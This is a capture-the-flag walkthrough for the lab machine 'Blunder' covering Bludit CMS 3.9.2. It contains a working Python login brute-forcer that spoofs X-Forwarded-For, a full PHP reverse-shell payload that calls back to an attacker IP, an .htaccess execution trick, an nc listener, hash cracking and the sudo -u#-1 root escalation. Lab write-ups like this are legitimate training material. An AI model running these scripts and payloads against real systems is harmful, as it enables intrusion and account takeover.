# Blunder
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

#### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan, Directory & File Enumeration | Identified open port 80 (HTTP) and a web server running Bludit CMS version 3.9.2. Found a possible username `fergus` in `todo.txt`. |
| 2 | (Web) | Authentication Bruteforce Bypass (X-Forwarded-For) | Used a script to bypass the IP-based bruteforce mitigation by setting a random `X-Forwarded-For` header. |
| 3 | fergus | Password Cracking, Web Login | Bruteforced the login for user `fergus` and discovered the password `RolandDeschain`. Gained access to the Bludit admin panel. |
| 4 | www-data | Bludit RCE (Authenticated File Upload) | Used a Metasploit module to exploit a directory traversal vulnerability, uploading a PHP reverse shell to `/bl-content/tmp/` and executing it to get a shell as `www-data`. |
| 5 | www-data | Local File Enumeration, Hash Cracking | Found the `users.php` flat file database for Bludit, containing a hash for the user `hugo`. Cracked the unsalted hash `faca404...98d` to find the password `Password120`. |
| 6 | hugo | SSH Login | Used the cracked password to switch to the `hugo` user on the system. |
| 7 | hugo | Sudo Misconfiguration (CVE-2019-14287) | Ran `sudo -l` and identified a vulnerable sudo configuration `(ALL, !root) /bin/bash`. |
| 8 | root | Privilege Escalation | Exploited the sudo misconfiguration by executing `sudo -u#-1 /bin/bash` to obtain a root shell. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-title: Blunder | A blunder of interesting facts
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
Before starting digging into port 21 let's poke around on port 80.  
As we hit the site homepage, we can see a site containing various articles and no much else.  
so let's start directory enumeration and see what we can find:  
```
/about                (Status: 200) [Size: 3281]
/0                    (Status: 200) [Size: 7562]
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
/usb                  (Status: 200) [Size: 3960]
/LICENSE              (Status: 200) [Size: 1083]
/%3FRID%3D2671        (Status: 200) [Size: 7562]
/server-status        (Status: 403) [Size: 277]
/%3F%3F               (Status: 200) [Size: 7562]
/%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F (Status: 200) [Size: 7562]
/%3Fmethod%3Declou3   (Status: 200) [Size: 7562]
/%3Fmethod%3Dbanner   (Status: 200) [Size: 7562]
/%3f                  (Status: 200) [Size: 7562]
```
Let's start enumerating files also:
```
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
/install.php          (Status: 200) [Size: 30]
/LICENSE              (Status: 200) [Size: 1083]
/about                (Status: 200) [Size: 3281]
/0                    (Status: 200) [Size: 7562]
/robots.txt           (Status: 200) [Size: 22]
/todo.txt             (Status: 200) [Size: 118]
/usb                  (Status: 200) [Size: 3960]
/.gitignore           (Status: 200) [Size: 563]
```
We can see the file todo.txt which contains:  
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```
Here we can see a possible user for this box: ```fergus```
After enumerating directories and files, let's dig into /admin folder, as we go there, we can see the title "bludit" pop up.  
Searching on google reveals that bludit is a flat-file cms:  
```
Bludit uses files in JSON format to store the content, you don't need to install or configure a database.
```
Now, let's try to enumerate bludit version and see if there is any exploit for it.  
If we open the source code, we can see in the header the version ```3.9.2```.  
As search for publicly available exploits we can see that the running version may be affected by several vulnerabilities:  
```
[root@kali Blunder ]$ searchsploit bludit    
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                                                                                                                                                      | php/webapps/50529.txt
Bludit 3.9.12 - Directory Traversal                                                                                                                                                                        | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                                                                      | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                                                                               | php/webapps/49037.rb
Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                                                                                 | php/webapps/48746.rb
Bludit 3.9.2 - Directory Traversal                                                                                                                                                                         | multiple/webapps/48701.txt
Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                                                                                | php/remote/47699.rb
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                                                                                          | php/webapps/46060.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
We have a directory traversal that unfortunately requires authentication and we have a bruteforce authentication mitigation bypass. Now let's try to combine these two vulnerabilities to gain access on the box.

## Foothold
As we examine Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass we can see the [original post](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) where basically the author says that is possible to bypass the ip ban in place at application level by using the X-Forwarded-for header, in fact we can see that the application tries to determine the true IP address of the end user by trusting the X-Forwarded-For and Client-IP HTTP headers:
```
public function getUserIp()
{
  if (getenv('HTTP_X_FORWARDED_FOR')) {
    $ip = getenv('HTTP_X_FORWARDED_FOR');
  } elseif (getenv('HTTP_CLIENT_IP')) {
    $ip = getenv('HTTP_CLIENT_IP');
  } else {
    $ip = getenv('REMOTE_ADDR');
  }
  return $ip;
}
```
Now, let's craft a python script to perform bruteforceing.  
```
#!/usr/bin/python3
import requests, re, random

URL="http://10.10.10.191/admin/login"
PROXY={ 'http' : 'http://127.0.0.1:8080' }

# Used to retreive Cookie and tokenCSRF
def init_session():
    r = requests.get("http://10.10.10.191/admin/")
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
    csrf = csrf.group(1)
    cookie = r.cookies.get('BLUDIT-KEY')
    return csrf, cookie

def login(username, password):
    csrf, cookie = init_session()
    cookies = { 'BLUDIT-KEY': cookie }
    headers = { 'X-Forwarded-For' : f'{random.randrange(1,256)}.{random.randrange(1,256)}.{random.randrange(1,256)}.{random.randrange(1,256)}' }
    data = {
            'tokenCSRF': csrf,
            'username': username,
            'password': password,
            'save' : ''
    }
    r = requests.post(URL, headers=headers, cookies=cookies, data=data, proxies=PROXY, allow_redirects=False) #Allow redirects=False beacause we want to grab 301
    m = re.search(r'Username or password incorrect', r.text)
    if(m!=None):
        return False
    else:
        print("[+]"+username+":"+password)


wl = open('cewl.txt').readlines()
for line in wl:
    passwd = line.strip()
    login("fergus", passwd)

```
Now, if we let the script run we can have:  
```
[root@kali Blunder ]$ ./bludit.py
[+]fergus:RolandDeschain
```
Now we can use these credentials to access Bludit CMS.  
Now that we have access, coming back to our initial findings, we can use the one authenticate exploit to hopefully gain an initial foothold.  
```
msf6 > search bludit           

Matching Modules               
================                                                                                                      

   #  Name                                          Disclosure Date  Rank       Check  Description     
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/bludit_upload_images_exec

msf6 > use exploit/linux/http/bludit_upload_images_exec
```
Now we can set options accordingly:
```
msf6 exploit(linux/http/bludit_upload_images_exec) > show options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS  RolandDeschain   yes       The password for Bludit
   BLUDITUSER  fergus           yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      10.10.10.191     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2
```
Now if we run the exploit we get a meterpreter session:  
```
msf6 exploit(linux/http/bludit_upload_images_exec) > run

[*] Started reverse TCP handler on 10.10.14.17:4444
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading cDgYmMchPH.png...
[*] Uploading .htaccess...
[*] Executing cDgYmMchPH.png...
[*] Sending stage (39282 bytes) to 10.10.10.191
[+] Deleted .htaccess
[*] Meterpreter session 3 opened (10.10.14.17:4444 -> 10.10.10.191:37696 ) at 2022-04-19 14:24:52 +0200

meterpreter >
```
Now, as always let's reverse the exploit to gain our own shell. Let's set the proxy for the exploit and analyze how it works request by request.  
In the first steps, we see that the exploit calls index.php in order to grab CSRF token as we did in our init_session() function.  
then , the exploit calls ```/admin/ajax/upload-images``` and tries to send a nasty php script in a .png format, setting the uuid value to ```../../tmp```, we can assume that this is the directory traversal vulnerability and the specified folder is the place where the file will be uploaded.  
```
-----------------------------743239273736140726080546615286
Content-Disposition: form-data; name="images[]"; filename="urRPSNKVaR.png"
Content-Type: image/png

<?php @unlink(__FILE__);/*<?php /**/ error_reporting(0); $ip = '10.10.14.17'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die(); ?>
-----------------------------743239273736140726080546615286
Content-Disposition: form-data; name="uuid"

../../tmp
-----------------------------743239273736140726080546615286
Content-Disposition: form-data; name="tokenCSRF"

92f6db87efe26f25cb7e6a8a8d2743d6f41995d5
-----------------------------743239273736140726080546615286--
```
Then the exploit, using the same form, tries to upload a .htaccess file containing a directive that will allow the webserver to execute .png files as scripts:  
```
-----------------------------162541449209088976078955525395
Content-Disposition: form-data; name="images[]"; filename=".htaccess"
Content-Type: image/png

RewriteEngine off
AddType application/x-httpd-php .png

-----------------------------162541449209088976078955525395
Content-Disposition: form-data; name="uuid"

3740583359713fcc4993def59a997742
-----------------------------162541449209088976078955525395
Content-Disposition: form-data; name="tokenCSRF"

bef07d953027dd57fd1c7a349a1fe25036d399d9
-----------------------------162541449209088976078955525395--
```
We get an image upload error for file not supported. This is expected, since by an (unsecure) design of the application all the files are uploaded to ```../../tmp``` folder before executing checks on target file.  
In fact, also without using .png extension, if we upload the shell in a .php format, it will be uploaded to ```../../tmp```
```
meterpreter > dir
Listing: /var/www/bludit-3.9.2/bl-content/tmp
=============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  5493  fil   2022-04-19 15:03:53 +0200  sh.php
040755/rwxr-xr-x  4096  dir   2022-04-19 14:42:38 +0200  thumbnails
```
now we can just call ```http://10.10.10.191/bl-content/tmp/sh.php``` or ```http://10.10.10.191/bl-content/tmp/sh.png``` using also the .htaccess file and get a shell.  
```
root@kali:~/Documents/HTB/Boxes/Blunder# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.191] 40866
Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:04:38 up  7:39,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shaun    :0       :0               06:25   ?xdm?   3:14   0.03s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## User
As always let's look for credentials into files.  
As discovered before, this is a flat-file CMS so we haven't got a database and all the data is stored inside .php files, so let's look into databse directory for both versions available under the web root:
```
www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{                                                                                                                     
    "admin": {      
        "nickname": "Admin",                
        "firstName": "Administrator",
        "lastName": "",                                 
        "role": "admin",                   
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",    
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",                                                                                               
        "instagram": "",
        "codepen": "",  
        "linkedin": "",
        "github": "",                         
        "gitlab": ""        
    },                                                                                                                
    "fergus": {
        "firstName": "",                            
        "lastName": "",   
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
}
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```
As we can notice, in version 3.10.0a there is an (unsalted) hash for user 'hugo', we can find the same user in the system so, let's try to crack the password.  
Before doing any calculation we can simpy google the hash and see what we can find.  
As we google the hash we can find [on this site](https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d) a match that is: 'Password120' now let's try this for switching to user hugo:  
```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su - hugo
Password:
hugo@blunder:~$
```


## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, a part from one not working exploit, we cannot see anything intresting.  
As we know, linpeas does not have password for ```sudo -l``` but we do, so let's run sudo -l and provide the discovered password:  
```
hugo@blunder:~$ sudo -l
Password:
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
We can notice this strange configuration in sudo ```(ALL, !root)``` as we google this string we se [CVE-2019-14287](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability) that allows privilege escalation with this configuration, since:  
```
The function which converts user id into its username incorrectly treats -1,or its unsigned equivalent 4294967295, like 0, which is always the user ID of root user.
```
so if we execute:  
```
hugo@blunder:~$ sudo -u#-1 /bin/bash
Password:
root@blunder:/home/hugo# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```
we get a shell as root.
